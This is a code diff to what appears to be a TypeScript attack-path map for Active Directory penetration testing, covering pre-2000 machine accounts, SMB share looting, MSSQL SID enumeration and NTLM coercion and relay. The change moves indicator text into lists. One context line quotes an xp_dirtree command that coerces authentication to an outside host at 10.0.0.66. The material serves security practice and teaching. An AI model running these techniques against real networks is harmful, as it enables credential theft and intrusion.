@@ -251,11 +251,33 @@ SQL> EXEC master..xp_dirtree '\\10.0.0.66\share',1,1`, lang: 'bash' },
 
 export const adNetexecEdges: AttackEdge[] = [
   // Parents (existing categories)
-  { source: 'ad-cat-noauth', target: 'pre2k-auth', description: 'Indicators this path applies: an SMB logon returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT with the correct password (a never-used trust account); a computer account name ending in $ that is a member of Pre-Windows 2000 Compatible Access; userAccountControl == 4128 (WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD) with logonCount == 0.' },
+  {
+    source: 'ad-cat-noauth', target: 'pre2k-auth',
+    requires: [
+      'an SMB logon returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT with the correct password (a never-used trust account)',
+      'a computer account name ending in $ that is a member of Pre-Windows 2000 Compatible Access',
+      'userAccountControl == 4128 (WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD) with logonCount == 0',
+    ],
+  },
   { source: 'cvegrp-smbprint', target: 'smbghost' },
-  { source: 'ad-cat-credaccess', target: 'smb-share-loot', description: 'Indicators this path applies: smbclient -N (null session) or -U domain\\user%pass connecting to a named share; smbmap / smbclient output shows READ or READ/WRITE on a non-default share (Public, Data, users$, Accounting, transfer); netexec -M spider_plus emitting spider_plus.json file inventory.' },
+  {
+    source: 'ad-cat-credaccess', target: 'smb-share-loot',
+    requires: [
+      'smbclient -N (null session) or -U domain\\user%pass connecting to a named share',
+      'smbmap / smbclient output shows READ or READ/WRITE on a non-default share (Public, Data, users$, Accounting, transfer)',
+      'netexec -M spider_plus emitting spider_plus.json file inventory',
+    ],
+  },
   { source: 'ad-cat-mssql', target: 'mssql-impersonation' },
-  { source: 'ad-cat-mssql', target: 'mssql-sid-enum', description: 'Indicators this path applies: MSSQL/TDS reachable on 1433 with a usable query channel (a SQL login or a SQL-injection sink); DEFAULT_DOMAIN() returns a domain name (the SQL host is domain-joined); SUSER_SID(\'<DOMAIN>\\Domain Admins\') returns a 28-byte SID ending in RID 512; SUSER_SNAME on a crafted SID resolves it to a DOMAIN\\account name.' },
+  {
+    source: 'ad-cat-mssql', target: 'mssql-sid-enum',
+    requires: [
+      'MSSQL/TDS reachable on 1433 with a usable query channel (a SQL login or a SQL-injection sink)',
+      'DEFAULT_DOMAIN() returns a domain name (the SQL host is domain-joined)',
+      'SUSER_SID(\'<DOMAIN>\\Domain Admins\') returns a 28-byte SID ending in RID 512',
+      'SUSER_SNAME on a crafted SID resolves it to a DOMAIN\\account name',
+    ],
+  },
   { source: 'ad-cat-user-secrets', target: 'app-config-secrets' },
   // Forward continuations (so none dead-end)
   { source: 'pre2k-auth', target: 'valid-domain-creds', label: 'machine account' },
@@ -270,7 +292,14 @@ export const adNetexecEdges: AttackEdge[] = [
   { source: 'mssql-sid-enum', target: 'asrep-roasting' },
   { source: 'app-config-secrets', target: 'lateral-movement-cme', label: 'reuse creds' },
   // MSSQL NTLM coercion → capture (crack) or relay, like the other coercion vectors
-  { source: 'ad-cat-coercion', target: 'mssql-coerce', description: 'Indicators this path applies: xp_dirtree; xp_fileexist; xp_subdirs.' },
+  {
+    source: 'ad-cat-coercion', target: 'mssql-coerce',
+    requires: [
+      'xp_dirtree',
+      'xp_fileexist',
+      'xp_subdirs',
+    ],
+  },
   { source: 'mssql-coerce', target: 'crack-netntlm', label: 'capture NetNTLM' },
   { source: 'mssql-coerce', target: 'ntlm-relay', label: 'relay the auth' },
 ];
